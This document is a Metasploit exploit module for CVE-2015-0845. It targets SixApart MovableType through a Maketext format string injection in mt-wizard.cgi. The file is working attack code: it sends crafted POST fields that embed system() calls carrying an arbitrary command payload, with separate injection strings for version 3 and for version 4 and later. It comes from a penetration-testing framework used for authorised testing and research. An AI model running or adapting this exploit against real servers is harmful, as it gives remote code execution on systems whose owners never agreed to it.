##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'SixApart MovableType Maketext Perl Code Execution',
        'Description'    => %q(
           This module exploits a flaw in the template rendering logic of MovableType to
           execute arbitrary code through a Locale::Maketext format string injection. This
           module has been verified against versions 3.38, 4.381 and 5.2.12.
        ),
        'Author'         =>
          [
            'John Lightsey'
          ],
        'License'        => MSF_LICENSE,
        'References'     =>
          [
            [ 'CVE', '2015-0845' ],
            [ 'URL', 'https://movabletype.org/news/2015/04/movable_type_608_and_5213_released_to_close_security_vulnera.html' ]
          ],
        'Privileged'     => false, # web server context
        'Payload'        =>
          {
            'DisableNops' => true,
            'BadChars'    => ' ' # <>"
          },
        'Compat'         =>
          {
            'PayloadType' => 'cmd'
          },
        'Platform'       => ['unix'],
        'Arch'           => ARCH_CMD,
        'Targets'        => [['Automatic', {}]],
        'DisclosureDate' => 'Apr 14 2015',
        'DefaultTarget'  => 0
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'MoveableType cgi-bin directory path', '/cgi-bin/mt/'])
      ], self.class
    )
  end

  #def check
    # TODO
  #end

  def exploit
    print_status("#{peer} - Sending payload using version 4+ attack method")

    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path, 'mt-wizard.cgi'),
      'vars_post' => {
        '__mode'   => 'retry',
        'step'     => 'cfg_dir',
        'temp_dir' => '<MT_TRANS phrase="[fail_with,MT::handler_to_coderef]"><MT_TRANS phrase="_.(print(qq{Content-type:text/plain\n\n})&&system(q{' + payload.encoded + '})||exit);#">'
      }
    }, 5)
    if res && res.code == 200 && res.body.include?("Unknown action retry")
      print_status("#{peer} - Sending payload using version 3 attack method")
      send_request_cgi({
        'method'    => 'POST',
        'uri'       => normalize_uri(target_uri.path, 'mt-wizard.cgi'),
        'vars_post' => {
          '__mode'   => 'start',
          'step'     => 'cfg_dir',
          'set_static_uri_to' => '<MT_TRANS phrase="[fail_with,MT::Bootstrap::import]"><MT_TRANS phrase="_x" params="1%%App%%CGI;print(qq{Content-type:text/plain\n\n});system(q{' + payload.encoded + '});exit;#">'
        }
      }, 5)
    end
  end

end
